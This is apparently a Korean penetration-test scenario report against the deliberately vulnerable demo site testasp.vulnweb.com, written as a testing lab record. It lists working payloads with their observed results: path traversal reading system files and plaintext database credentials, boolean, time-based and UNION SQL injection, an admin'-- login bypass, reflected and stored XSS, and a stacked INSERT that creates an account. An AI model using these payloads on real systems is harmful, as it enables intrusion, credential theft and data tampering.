# PoC-시나리오 — testasp-vulnweb-jev-trial

`PoC-코드.md` 의 실행 순서·맥락을 단계별로 서술한다. 각 단계는 **실제 실행으로 확인된 결과**를 적었고,
예상과 다를 때의 해석(함정)도 함께 남긴다.

대상: `http://testasp.vulnweb.com` · 전 단계 합계 소요: 수 분 · 데이터 변경: 4·5·6단계(표시됨)만

---

## 시나리오 A — 파일 읽기 → 소스/자격증명 확보 (읽기 전용)

1. **대조군 요청** — `Templatize.asp?item=html/about.html` 로 정상 동작을 먼저 확인한다(→ 200, 4594B).
   *이 앱은 파라미터가 없거나 파일이 없으면 500(IIS 기본 1208B)을 낸다 — 대조군 없이 판정하면 오판한다.*
2. **경로 탈출** — `item=../../../../windows/win.ini` 실행 → 200 + `[fonts]` 헤더 확인.
3. **범위 확인** — `system.ini`, `system32/drivers/etc/hosts` 도 200 → 웹루트 밖 읽기 확정.
4. **두 번째 인스턴스** — `shownews.asp?item=../../../../windows/win.ini` → 200 raw(템플릿 래퍼 없음).
   *`shownews.asp` 는 어느 페이지에서도 링크되지 않는 orphan 이다(정찰로 발견).*
5. **소스 유출** — `Templatize.asp?item=db.asp` → DB 접속문자열 + `Uid=acunetix`/`Pwd=`**평문**을 그대로 열람.
   6. 이어서 `Login.asp`/`showforum.asp`/`showthread.asp`/`Search.asp`/`Register.asp`/`Default.asp` 소스를 전부 읽어
   **결합 지점과 파괴적 분기(total>100 → DELETE)** 를 사전 파악한다 → 이후 모든 공격의 안전 조건이 여기서 나온다.
6. **결과** — LFI 2곳 + 소스 평문 노출 + DB 자격증명 노출. (증거: `evidence/win_ini_output.body`, `evidence/db_asp_source.body`)

## 시나리오 B — SQLi 3지점 (읽기 전용)

1. **boolean 판정(showforum)** — `id=1`(200) → `id=1 AND 1=1`(200) → `id=1 AND 1=2`(500).
   *함정: 오류 기반이 불가하다(500 이 1208B IIS 기본 페이지라 SQL 오류문이 안 나옴). 반드시 `(1=1)/(1=2)` 쌍으로 판정.*
2. **시간차(스택드)** — `id=0;IF 1=1 WAITFOR DELAY '0:0:02'--` vs `IF 1=2` → 참 32.47s / 거짓 0.35s.
   *데이터 변경 없는 유일한 스택드 증명 수단(지연만 사용).*
3. **UNION 열수 확정(Search.asp)** — 3열 500, 9열 500, **10열만 렌더** → `DB_NAME()`·`@@version`·`SUSER_NAME()` 을 1요청으로 열람.
   *showforum/showthread 는 같은 `id` 를 2~5개 쿼리에 재사용해 UNION 열수 정합이 불가 → blind 전용.*
4. **자격증명 평문** — `users` 컬럼 `uname/upass/email/realname/avatar`, `upass` 가 평문. 대량 반출은 하지 않고 **MIN(uname) 1행만 샘플링**.
5. **결과** — SQLi 3/3 성립, 임의 SELECT 가능(증거: `evidence/sqli_boolean_true.body`, `sqli_union_10col.body`, `sqli_requests.jsonl`)

## 시나리오 C — 인증 우회 → 세션 확보 (읽기 전용)

1. `POST Login.asp` 에 `tfUName=admin'--` + 아무 비밀번호 → **302 + Location: Default.asp + ASPSESSIONID 쿠키**.
2. 대조군: `nosuchuser_zz` → 200(실패) → 302 가 "로그인 성공"의 신호임을 확정.
3. 세션으로 `showforum.asp?id=1` → **게시 폼(tfSubject) 노출**(익명 3077B vs 인증 4146B) → 인증 전용 기능 접근 확인.
4. `RetURL=http://example.com/` 를 붙이면 **Location 이 외부 도메인 그대로**(오픈 리다이렉트). 무인증 `Logout.asp?RetURL=` 도 302.
5. **함정** — `x' OR '1'='1` 류는 200(실패)이다. 쿼리가 `WHERE uname='x' OR '1'='1' AND upass='x'` 로 조합되어
   AND 우선순위 때문에 0행이 되기 때문 → **`--` 주석형만** 통한다.
6. **중요 발견** — 세션에 저장되는 값은 DB 행이 아니라 **입력 원문**이다(`Login.asp:36`).
   이 하나의 사실이 아래 두 임팩트를 동시에 만든다:
   - 세션명에 `'` 가 들어감 → 게시 시 SQL 문자열이 깨져 **500**(second-order, 시나리오 E)
   - 세션명에 `<img onerror=...>` 가 들어감 → 모든 페이지 메뉴에 **원문 렌더**(반사 XSS, 시나리오 D-1)

## 시나리오 D — XSS 2경로

**D-1. 반사형(쓰기 0)** — `tfUName=admin' AND '<img src=x onerror=alert(1)>'='<img …>'--` 로 로그인(→302) →
`Default.asp` 조회 시 `onerror=alert(1)` 이 원문 출력.
*주의: 페이로드 단독(`<img …>'--`)은 `WHERE uname='<img …>'` 가 0행이라 로그인 자체가 200 실패한다
— 로그인 판정이 "행 존재 여부"이므로 **행을 반환하는 조건을 함께** 넣어야 한다.*

**D-2. 저장형(쓰기 1건)** — 우회 세션으로 `showthread.asp?id=1` 에 `tfText=<script>alert('acu-stored-xss')</script>` 게시 →
**비인증** 재방문에서 그대로 렌더(`<div class='posttext'><script>…</script></div>`), CSP/X-XSS/XFO 헤더 없음.
*운영 관찰: 게시 직후 사라졌다 — 이 데모의 리셋 또는 다른 테스터 요청이 앱 자체 정리 분기를 태운 결과로 보임 → 증거는 시각 기준으로만 유효.*

## 시나리오 E — second-order (쓰기 시도, 실패로 확인)

1. 시나리오 C 의 우회 세션(`uname = admin'--`)을 유지한 채 `showthread.asp?id=3` 에 답글 POST.
2. 결과 **500**(1208B) — `posts.poster` 로 들어가는 `Session.Contents("uname")` 이 무이스케이프라 INSERT 문이 깨진다.
3. 정상 세션(따옴표 없는 계정)으로 같은 요청 → 200. **이 차이가 곧 증거**이며, 게시 기능이 파괴되는 임팩트다.

## 시나리오 F — 임의 DML (쓰기 1건, 자체 행)

1. `id=0;INSERT INTO users (uname,upass,email,realname,avatar) VALUES('acu-r3','P@ss-r3-verify','r3@example.com','r3','')--`
   를 **GET** 으로 전송(⚠️ POST 경로에 id 주입 금지 — 파괴적 분기).
2. UNION 으로 방금 넣은 값이 조회되는지 확인.
3. 그 계정으로 `Login.asp` POST → **302** → 실제로 사용 가능한 계정 행이 생성되었음이 확정(기존 사용자 행은 변경하지 않음).

## 시나리오 G — 상한 확인 / 부정 결과 (읽기 전용)

1. 권한 오라클 1요청으로 `SYSADMIN=0`, `XPCMD=0`(xp_cmdshell `value_in_use=0`), `CTRL=0`, `BUILD` 권한 없음 →
   **OS 명령 실행·스키마 변경·권한 상승 경로 없음**을 확인(실행 시도 자체를 하지 않음).
2. 교차 DB 읽기 가능(acublog 1행/acuservice 2행, **행 수만**), 쓰기 **권한**은 존재(`acublog.users` UPDATE=1) — 실행하지 않음.
3. `/_vti_pvt/service.pwd` 404, `/admin`·`/web.config` 404, IIS 8.3 단축명 404, TRACE 501, PUT 거부 →
   재탐색 불필요 항목 확정.
